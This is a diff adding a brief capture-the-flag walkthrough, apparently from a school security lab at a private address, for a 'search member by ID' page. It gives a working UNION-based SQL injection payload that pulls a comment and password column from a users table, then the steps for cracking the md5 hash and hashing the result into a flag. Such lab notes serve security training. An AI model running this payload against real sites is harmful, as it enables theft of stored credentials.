@@ -1,0 +1,6 @@
+Make this SQL Injection in the "SEARCH MEMBER BY ID:" field :
+1 AND 1=2 UNION SELECT Commentaire, countersign FROM users WHERE user_id = 5
+
+Get the code, follow the instruction (md5 decode, lowercase, then sha256 encode the result (FortyTwo))
+
+URL: http://10.13.0.186/?page=member
